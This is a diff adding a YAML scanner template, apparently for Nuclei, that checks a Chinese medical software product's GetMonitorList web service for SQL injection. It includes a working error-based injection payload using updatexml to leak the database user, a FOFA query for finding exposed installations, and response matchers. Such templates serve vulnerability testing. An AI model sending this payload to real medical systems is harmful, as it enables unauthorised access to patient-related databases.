@@ -1,0 +1,30 @@
+id: bianquefly-GetMonitorList-sqli
+info:
+  name: 扁鹊医疗GetMonitorList sql注入
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/crushforyou/2025hvv-poc/blob/main/%E6%89%81%E9%B9%8A%E5%8C%BB%E7%96%97/%E6%89%81%E9%B9%8A%E5%8C%BB%E7%96%97GetMonitorList%20sql%E6%B3%A8%E5%85%A5.txt
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: icon_hash="-757866684" || icon_hash="-1206146847" || body="http://www.ivtbq.com"
+    tips:
+    repair:
+    version:
+  tags: bianquefly,sqli
+
+http:
+  - raw:
+      - |
+        GET /AppService/BQMedical/WebServiceForFirstaidApp.asmx/GetMonitorList?UserID=1&OperatorID=1&SearchName=string%27%26%26+updatexml(1,CONCAT_WS(1,1,current_user),1)+%26%26%27 HTTP/1.1
+        Host: {{Hostname}}
+ 
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 500
+          - contains_all(body,'XPATH syntax error')
+        condition: and
